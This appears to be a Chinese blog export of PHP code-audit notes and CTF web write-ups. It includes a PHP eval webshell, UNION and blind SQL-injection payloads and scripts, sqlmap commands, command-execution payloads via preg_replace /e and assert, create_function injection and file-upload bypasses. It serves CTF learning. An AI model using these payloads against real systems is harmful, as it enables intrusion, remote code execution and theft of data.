parse_str(string,array) parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。 1234567&lt;?php$name = 'peri0d';parse_str('name=peri0d_2&amp;sex=1');echo $name."&lt;br&gt;";echo $sex;//peri0d_2 1?&gt; 1234567891011121314151617&lt;?phpif(empty($_GET['x']))&#123; show_source(__FILE__); die();&#125;else&#123; include('flag.php'); $m = "guest"; $x = $_GET['x']; @parse_str($x); if($m[0] == "admin")&#123; echo $flag; &#125;else&#123; exit("so easy!"); &#125;&#125;?&gt; payload：?x=m[0]=admin parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。 反序列化漏洞序列化和反序列化 序列化：把一个复杂的数据类型压缩为一个字符串 反序列化：把一个字符串恢复成复杂的数据类型 12345678&lt;?php$x = &quot;peri0d 2019&quot;;$y = array(&quot;peri0d&quot;,2019);echo serialize($x).&apos;&lt;br&gt;&apos;;echo serialize($y);//s:11:&quot;peri0d 2019&quot;;//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;?&gt; 漏洞成因 反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击 unserialize 函数的变量可控 php 文件存在可利用的类，类中有魔术方法 序列化的不同结果 public private protect 12345678910&lt;?phpclass test&#123; private $x = "peri0dx"; public $y = "peri0dy"; protected $z = "peri0dz";&#125;$t = new test();echo serialize($t);//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;?&gt; 魔术方法 construct() : 当一个类被创建时自动调用 destruct() : 当一个类被销毁时自动调用 invoke() : 当把一个类当作函数使用时自动调用 toString() : 当把一个类当作字符串使用时自动调用 wakeup() : 当调用unserialize()函数时自动调用 sleep() : 当调用serialize()函数时自动调用 call() : 当要调用的方法不存在或权限不足时自动调用 get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值 set() : 将数据写入不可访问属性 例子CVE-2016-7124 弱类型变量类型 标准类型：布尔，整型，浮点，字符 复杂类型：数据，对象 特殊类型：资源 操作之间的比较 字符串和数字 123456&lt;?phpvar_dump(0 == "admin"); //Tvar_dump("1admin" == 1); //Tvar_dump("admin1" == 1); //Fvar_dump("admin1" == 0); //T?&gt; 数字和数组 12345&lt;?php$arr = array();var_dump(0 == $arr); //Fvar_dump(123 == $arr); //F?&gt; 字符串和数组 12345&lt;?php$arr = array();var_dump('0' == $arr); //Fvar_dump('123' == $arr); //F?&gt; “合法数字+e+合法数字” 类型的字符串 12345&lt;?phpvar_dump("0e1234" == "0e56789"); //Tvar_dump("1e1123" == "10"); //Fvar_dump("1e1" == "10"); //T?&gt; == 和 === 在PHP里面 == 比较指比较值，不同类型会转换成同一类型比较。用 === 比较时，必须值和类型都一样才为true empty 与 isset 变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true 变量未定义或为 null 时，isset 函数返回 false，其他都返回 true md5 函数传入数组进行比较时全为 true 12345&lt;?php$arr1 = array('test1', 'test2', '2019');$arr2 = array('test3', 'test4', '2019');var_dump(md5($arr1) == md5($arr2)); //T?&gt; strcmp 函数 strcmp(string1, string2) 比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0 12345678910&lt;?php$pass = '123456';if(isset($_GET['pwd']))&#123; if(strcmp($_GET['pwd'], $pass) == 0)&#123; echo 'success'; &#125;else&#123; echo 'fail'; &#125;&#125;?&gt; payload：?pwd[]=1 in_array() 与 array_search()in_array() 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。 bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) array_search() 函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。 array_search(value, array, strict) switch如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型 伪协议file:// 用于访问本地系统文件，不受 allow_url_fopen 和 allow_url_include 影响 常与文件包含结合在一起使用 php://filter 读取源代码并以base-64编码形式输出，不受 allow_url_fopen 和 allow_url_include 影响 常与文件包含结合在一起使用 经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php php://input 可以访问请求的原始数据的只读流，allow_url_include 为 on 时可以使用，不受 allow_url_fopen 影响 会话认证漏洞 Session 固定攻击 Session 劫持攻击 通常出现在 cookie 验证上，通常不使用 session 认证 Session 劫持攻击 获取用户的 session id，然后修改数据 Session 固定攻击 用户使用了黑客发送的 session id，网站就不会给用户发送 session id]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝鲸安全打卡Web分析]]></title>
    <url>%2F2019%2F06%2F01%2F%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[蓝鲸打卡的一个 web 文件上传引发二次注入的题解和思考 蓝鲸文件管理系统源代码地址：http://www.whaledu.com/course/290/task/2848/show 首先在设置文件里把所有的输入都采用 addslashes() 函数进行转义 upload.php关键代码将上传的文件通过pathinfo()函数分成三个部分，[dirname] [filename] [extension] 然后进行后缀名检查，拼接后进行addslashes转义，查询是否存在这个文件 123456789101112131415161718if($file["error"] == UPLOAD_ERR_OK) &#123; $name = basename($file["name"]); $path_parts = pathinfo($name); if(!in_array($path_parts["extension"], array("gif", "jpg", "png", "zip", "txt"))) &#123; exit("error extension"); &#125; $path_parts["extension"] = "." . $path_parts["extension"]; $name = $path_parts["filename"] . $path_parts["extension"]; $path_parts['filename'] = addslashes($path_parts['filename']); $sql = "select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"; $fetch = $db-&gt;query($sql); if($fetch-&gt;num_rows&gt;0) &#123; exit("file is exists"); &#125; 将文件名和后缀名插入数据库，将文件移动到相应文件夹并返回路径 12345678910111213141516if(move_uploaded_file($file["tmp_name"], ROOT . UPLOAD_DIR . $name)) &#123; $sql = "insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"; $re = $db-&gt;query($sql); if(!$re) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $url = "/" . UPLOAD_DIR . $name; echo "Your file is upload, url: &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\"/\"&gt;go back&lt;/a&gt;"; &#125; else &#123; exit("upload error"); &#125; rename.php关键代码查询旧文件是否存在 1234567if(isset($req['oldname']) &amp;&amp; isset($req['newname'])) &#123; $result = $db-&gt;query("select * from `file` where `filename`='&#123;$req['oldname']&#125;'"); if ($result-&gt;num_rows&gt;0) &#123; $result = $result-&gt;fetch_assoc(); &#125;else&#123; exit("old file doesn't exists!"); &#125; 更新filename，将oldname和newname重组，查询oldname是否存在，然后将文件的oldname更新为newname 12345678910111213141516171819if($result) &#123; $req['newname'] = basename($req['newname']); $re = $db-&gt;query("update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; $oldname = ROOT.UPLOAD_DIR . $result["filename"].$result["extension"]; $newname = ROOT.UPLOAD_DIR . $req["newname"].$result["extension"]; if(file_exists($oldname)) &#123; rename($oldname, $newname); $url = "/" . $newname; echo "Your file is rename, url: &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\"/\"&gt;go back&lt;/a&gt;"; &#125; else&#123;echo $oldname." not exists.";&#125;&#125; 解题思路在upload的过程中，全程进行转义并检测后缀，无法对上传进行操作，但是在rename的时候，没有对newname进行控制，这就可能会造成update的二次注入。 假设我们上传的文件是 1.jpg，然后进行改名，这个时候就会触发数据库的update语句 update `file` set `filename`=’newname’, `oldname`=’1’ where `fid`=fid 很明显，这里的newname和oldname都是我们可以控制的。 考虑上传问题，假设 1.jpg 是一句话木马，要把 1.jpg 变成 1.php，由于filename和extension分开操作，然后再合并，所有这里希望extension为空，这样在rename时可以将 1.jpg 变成 1.php。 构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg 解释： 文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下 注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’ 然后进行update，这时执行了构造的SQL语句，数据库如下 注意这两行代码 12$oldname = ROOT.UPLOAD_DIR . $result["filename"].$result["extension"];$newname = ROOT.UPLOAD_DIR . $req["newname"].$result["extension"]; 在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg 解决构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 1.jpg.jpg 构造另外一个一句话木马文件1.jpg，上传，数据库如下 再进行rename，传入的oldname为 1.jpg，newname为 1.php 进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’ 在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>whale CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界Web新手]]></title>
    <url>%2F2019%2F06%2F01%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E6%96%B0%E6%89%8B%2F</url>
    <content type="text"><![CDATA[攻防世界入门的题目 view source禁用右键，F12审查元素 get posthackbar进行post robots直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问 backup备份文件一般是在后缀名后加.swp，.bak 本题尝试index.php.bak成功获取源码 cookieburp抓包，发现提示，查看cookie.php，在响应头发现flag 火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可 disabled_buttonF12审查元素，找到按钮对应的代码，发现disabled=””，具体属性可以查看w3school，删除这个属性即可。 simple_js拿到js源码，根据分析可以知道，函数 dechiffre(pass_enc) 的返回值与传入参数无关 根据\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30，替换\x为%，再URLdecode一下，得到55,56,54,79,115,69,114,116,107,49,50，Firefox控制台运行一下 xff_refererburp改包 weak_auth审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。 webshell直接使用蚁剑 command_execution关于命令执行，windows或linux下: command1 &amp;&amp; command2 先执行command1后执行command2 command1 | command2 只执行command2 command1 &amp; command2 先执行command2后执行command1 本题先使用ls不断遍历目录，查找flag，最后再读取 simple_php看到源码，考察php弱类型 123456789101112131415&lt;?phpshow_source(__FILE__);include("config.php");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; == 比较var_dump(‘a’ == 0) //truea会被转化为数字0var_dump(‘1234a’ == 1234) //true这里’1234a’会被转化为1234 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。== 在进行比较的时候，会先将字符串类型转化成相同，再比较。 在$a==$b的比较中 1234$a=' ';$b=null //true$a=null;$b=true //true$a=0;$b='0' //true$a=0;$b='abcdef ' //true 而0===’abcdef ' false 总结 F12常开着 burp常开着 试试访问robots.txt 备份文件一般是在后缀名后加.swp，.bak 蚁剑是有两个部分的，一个是启动程序，一个是源码 php的弱类型]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[攻防世界Web进阶]]></title>
    <url>%2F2019%2F06%2F01%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[攻防世界 web 进阶题解 ics-06纯脑洞题，注意题目描述，报表中心 进入主页后，选择报表中心，发现URL有个id参数，爆破到id=2333即可 NewsCenter一个搜索框，尝试注入 输入 ‘ 返回空白页面，输入 ‘ # 返回正常，确定为字符注入 12345678910111213&apos; order by 3 # //确认select字段为3&apos; union select 1,2,3 # //确认1，2，3的位置&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 0,1) # //输出第一个库,INFORMATION_SCHEMA&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 1,1) # //输出第二个库,news,这里试出来总共就2个库&apos; union select 1,2,(select table_name from information_schema.tables where table_schema=&apos;news&apos; limit 1,1) # //这里试出来secret_table表&apos; union select 1,2,(select column_name from information_schema.columns where table_name=&apos;secret_table&apos; limit 0,1) # //这里试出来fl4g字段&apos; union select 1,2,(select fl4g from secret_table) # //直接查询 mfw打开About页面，发现提示，git，尝试git泄露，githack下载源码，放到Seay中 目录结构 可能存在的漏洞 在index.php页面发现危险函数assert()，eval与assert都算是元老级一句话后门函数 eval函数中参数是字符，如： 1eval('echo 1;'); assert函数中参数为表达式 （或者为函数），如： 12assert(phpinfo());assert(eval('echo 1;')); index.php源码 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = "home";&#125;$file = "templates/" . $page . ".php";// I heard '..' is dangerous!assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");// TODO: Make this look niceassert("file_exists('$file')") or die("That file doesn't exist!");?&gt; 第一个assert检测传入参数，防止LFI，第二个assert检查文件是否存在 可以在assert中构造代码执行，即system(‘cat templates/flag.php’)，直接闭合strpos函数即可 12345$page = "about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag"; //第三步$file = "templates/about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag.php"; //第二步assert("strpos('templates/about.php','..') === false and system('cat templates/flag.php') and strpos('templates/flag.php', '..') === false"); //第一步 NaNNaNNaNNaN-Batman下载附件，是一段js代码，后缀名改成html 最后的eval是执行函数，将eval改为console.log，向控制台输出一条消息 即可查看代码 12345678910111213141516171819function $()&#123;var e=document.getElementById("c").value;if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null)&#123; var t=["fl","s_a","i","e&#125;"]; var n=["a","_h0l","n"]; var r=["g&#123;","e","_0"]; var i=["it'","_","n"]; var s=[t,n,r,i]; for(var o=0;o&lt;13;++o)&#123; document.write(s[o%4][0]);s[o%4].splice(0,1) &#125; &#125;&#125;document.write('&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');delete _ 要求： 1、字符串长度16 2、以be0f23开头 3、以e98aa结尾 4、有233ac和c7be9 很容易拼接得到结果：be0f233ac7be98aa PHP2访问index.phps，获取源码片段，别问怎么知道的 123456789"); exit(); &#125; $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "admin") &#123; echo "Access granted!"; echo "Key: xxxxxxx "; &#125; ?&gt; get一个参数id，id进行urldecode之后为admin，admin的url编码是%61%64%6D%69%6E，再进行一次url编码，为%2561%2564%256D%2569%256E，在index.php中提交。 unserialize3在主页获取到部分代码，盲猜反序列化 12345class xctf&#123; public $flag = '111'; public function __wakeup()&#123; exit('bad requests');&#125; __wakeup()这个函数是在对象创建的时候执行的，也就是说在创建一个 xctf 对象时，就立刻退出了 绕过方法：使类的属性数量大于原来的就可以了 123456789&lt;?phpclass xctf&#123; public $flag = '111';&#125;$a = new xctf();$a = serialize($a);print_r($a);//$a = O:4:"xctf":1:&#123;s:4:"flag";s:3:"111";&#125;?&gt; 将序列化结果改为 O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;} 即可 upload文件上传，js前端验证后缀名，基于本地验证文件是否符合要求。直接将js禁用。或者burp抓包后修改后缀，将php文件后缀先改为jpg，burp抓包后改回php。 新建文件1.php，内容如下 1&lt;?php @eval($_POST['shell']);?&gt; 改名为1.jpg，然后上传，burp修改后缀，蚁剑连接。 Confusion1TriangleCat在URL栏fuzz URL得到如下结果： 1、正常URL，返回ping结果 2、非法URL(特殊符号)，返回Invalid URL 3、%80，返回Django报错 将报错信息保存为html，打开即为django报错页面 发现数据库路径 pyload：@/opt/api/database.sqlite3 保存为html文件，发现flag 总结： 当 CURLOPT_SAFE_UPLOAD 为 true 时，PHP 可以通过在参数中注入 @ 来读取文件。 当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。 wtf.sh-150ics-04根据提示，可利用的页面有三个，分别为 login.php，register.php，findpwd.php 发现 findpwd.php 存在注入 sqlmap 一把梭 12345python2 sqlmap.py -u "http://111.198.29.45:52139/findpwd.php" --data "username=aaa" python2 sqlmap.py -u "http://111.198.29.45:52139/findpwd.php" --data "username=aaa" --tablespython2 sqlmap.py -u "http://111.198.29.45:52139/findpwd.php" --data "username=aaa" -D cetc004 -T user --dump 得到用户信息 这里又一个逻辑漏洞，可以覆盖已注册的用户，重新注册一下用户即可 ics-05index.php?page=index 观察URL，明显是个文件包含 index.php?page=php://filter/convert.base64-encode/resource=index.php 读取index.php，关键代码 123456789101112131415if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') &#123; echo "&lt;br &gt;Welcome My Admin ! &lt;br &gt;"; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125; X-Forwarded-For:127.0.0.1/index.php?pat=/test/e&amp;rep=system(‘ls’);&amp;sub=test /index.php?pat=/test/e&amp;rep=system(‘ls+-a+./s3chahahaDir’);&amp;sub=test /index.php?pat=/test/e&amp;rep=system(‘cat+./s3chahahaDir/flag/flag.php’);&amp;sub=test 遍历出目录，直接读取flag 总结： preg_replace的 /e 模式会导致命令执行 bugi-got-id-200ics-07easysqlGuesslottery打开robots.txt，发现是个.git源码泄露，githack下载源码，很明显，buy是最关键的部分 数据是通过json传输的，buy的数据格式就是{“action”:”buy”,”numbers”:”1234567”} 关键函数 12345678910111213function buy($req)&#123; require_registered(); require_min_money(2);$money = $_SESSION['money'];$numbers = $req['numbers'];$win_numbers = random_win_nums();$same_count = 0;for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125;&#125; 存在一个弱类型比较，$numbers[$i] == $win_numbers[$i]，直接让传输的numbers全为true，即构造{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}，刷金币购买flag]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JACTF Web部分]]></title>
    <url>%2F2019%2F06%2F01%2FJACTF-Web%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[掘安团队的题目 平台已不运营 Web签到 发现请求URL为flag.php，但是会跳转到404.php页面，抓包发现有302重定向，查看响应包，flag经过base64编码，解码即可 Tips： 重定向分为301和302两种 301为永久性 302为暂时性 下载下载 直接请求?file=flag.php，获取源码，直接使用解密函数即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpheader('Content-Type: text/html; charset=utf-8'); //网页编码function encrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key &#123;$x&#125;; $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; $str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 ); &#125; return base64_encode ( $str );&#125;function decrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= substr ( $key, $x, 1 ); $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123; $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); &#125; else &#123; $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); &#125; &#125; return $str;&#125;$key="MyCTF";$flag="o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=";//encrypt($flag,$key);//添加下面的语句即可echo decrypt($flag,$key);?&gt; 该网站已被黑 御剑扫描一波 登入shell.php 可以使用burp暴力破解，密码为hack 曲折的人生看到一个登陆页面，随便输入 有返回报错信息，可以构造or语句，获取登陆密码和用户名 1select id,username,password from `admin` where username=&apos;admin&apos;用户名:admin不正确 构造如下 1select id,username,password from `admin` where username=&apos;&apos; or ascii(substr((select password from `admin` limit 0,1),1,1))&gt;1 # &apos;&apos; 写个脚本Fuzz一下 12345678910111213141516import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php?check'uname_list = [' ', 'select', 'or', 'and', 'union', '\'', 'from', '\\', '#', '--', '+']for i in uname_list: data = &#123;'username':i&#125; result = requests.post(url=url, data=data) soup = BeautifulSoup(result.text,'lxml') links = soup.find_all('div', class_='tip') for j in links: print(i + " 结果 " + j.get_text()) print('************************************') 可以知道，空格，select，or，union被过滤，但是可以采取重写方式绕过，空格采取/**/方式绕过 注入脚本 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php?check'password = []#s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))=3/**/#'"#判断长度for i in range(0,100): s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))="+str(i)+"/**/#'" data = &#123;'username':s&#125; result = requests.post(url=url, data=data) if('goodboy' in result.text): print(i) length_pass = i soup = BeautifulSoup(result.text,'lxml') links = soup.find_all('div', class_='tip') for x in links: print(" 结果 " + x.get_text()) print('************************************') break#s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),1,1))&gt;1/**/#'"#判断内容l = 1for i in range(1,length_pass+1): for j in range(32,127): s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),"+str(i)+",1))"+"="+str(j)+"/**/#'" data = &#123;'username':s&#125; result = requests.post(url=url, data=data) if('goodboy' in result.text): print("第" + str(l) + "次") l = l + 1 password.append(chr(int(j))) continueprint(''.join(password))#ajahas&amp;&amp;*44askldajaj#goodboy_g-60Hellowor 这里过滤了or 应输入 goodboy_g-60Hellowoorr 快速计算脚本 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupurl = 'http://120.79.1.69:10005/index.php'sess = requests.Session()r = sess.get(url=url)soup = BeautifulSoup(r.text,'lxml')links = soup.find_all('div', class_='rep')for i in links: s = i.get_text() s = s.replace('（','(')s = s.replace('）',')')s = s.replace('X','*')print(s)num = eval(s)print(num)urls = 'http://120.79.1.69:10005/index.php?check'password = 'ajahas&amp;&amp;*44askldajaj'uname = 'goodboy_g-60Hellowoorr'data = &#123;'username':uname, 'password':password, 'code':num&#125;res = sess.post(url=urls, data=data)print(res.text) 得到的响应，一个压缩包，也给出了解压密码 解压之后，有一个加密的flag.zip，Form1.txt给出了解密方法，python脚本破解一下，结果是VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 123456789101112re_string = "VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="def get_password(s): i = 1 k = '' while(i &lt;= len(s)): k = k + s[i-1:i] i = i + (i%5) return kpassword = get_password(re_string)print(get_password(password)) 快速计算的那个也可以用正则表达式，这里用的是beautifulsoup解析，根据他class=rep这个唯一特征。 not easy代码审计的题目 123456789101112131415&lt;?phperror_reporting(0);if(isset($_GET['action'])) &#123; $action = $_GET['action'];&#125;if(isset($_GET['action']))&#123; $arg = $_GET['arg'];&#125;if(preg_match('/^[a-z0-9_]*$/isD', $action))&#123; show_source(__FILE__);&#125; else &#123; $action($arg,'');&#125; 这一题是create_function()注入。正则表达式中/i不区分大小写，/s匹配任何不可见字符，/D如果使用$限制结尾字符，则不允许结尾有换行。相当于在不允许使用数字字母下划线的情况下，调用函数。 这里使用的绕过方案是在函数前面加一个 \ ，P神在小密圈的解释 php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 对于create_function()，官方给的解释如下图 以如下代码为例 12345678&lt;?php$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');echo "New anonymous function: $newfunc\n";echo $newfunc(2, M_E) . "\n";// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; 第一行代码等价于 12345eval(function __lambda_func($a, $b)&#123; return "ln($a) + ln($b) = " . log($a * $b); &#125;) 在本题中，构造$action=\create_function，$action($arg,’’); 即为： 123function lambda_1($arg)&#123; '';&#125; 构造$arg=){}print_r(scandir(‘./‘));/*，即可。 audit又是代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phphighlight_file(__FILE__);include(&apos;flag.php&apos;);$str1 = @$_GET[&apos;str1&apos;];$str2 = @$_GET[&apos;str2&apos;];$str3 = @$_GET[&apos;str3&apos;];$str4 = @$_GET[&apos;str4&apos;];$str5 = (string)@$_POST[&apos;str5&apos;];$str6 = (string)@$_POST[&apos;str6&apos;];$str7 = (string)@$_POST[&apos;str7&apos;];if( $str1 == $str2 )&#123; die(&apos;str1 OR Sstr2 no no no&apos;);&#125;if( md5($str1) != md5($str2) )&#123; die(&apos;step 1 fail&apos;);&#125;if( $str3 == $str4 )&#123; die(&apos;str3 OR str4 no no no&apos;);&#125;if ( md5($str3) !== md5($str4))&#123; die(&apos;step 2 fail&apos;);&#125;if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123; die(&apos;str5 OR str6 OR str7 no no no&apos;);&#125;if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123; die(&apos;step 3 fail&apos;);&#125;if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))&#123; echo &quot;come on!&quot;; die();&#125;$a = $_POST[&apos;a&apos;];$b = $_POST[&apos;b&apos;];$m = $_GET[&apos;m&apos;];$n = $_GET[&apos;n&apos;];if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) &#123; echo &quot;a OR b fail!&quot;; die();&#125;if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) &#123; echo &quot;m OR n fail&quot;; die();&#125;$str8 = hash(&apos;md5&apos;, $a, false);$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))&#123; echo &quot;You&apos;re great,give you flag:&quot;; echo $flag;&#125; 第一部分 str1和str2进行md5弱比较，以0e开头的会被识别为科学计数法，结果均为0 str3和str4进行md5强比较，传入数组绕过 str5，str6，str7只能进行md5碰撞，需要生成三个md5相同的文件绕过 参考这篇文章：基于全等的MD5碰撞绕过 1234567D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o test0.txt test1.txt //-o参数代表随机生成两个相同MD5的文件D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p test1.txt -o test00.txt 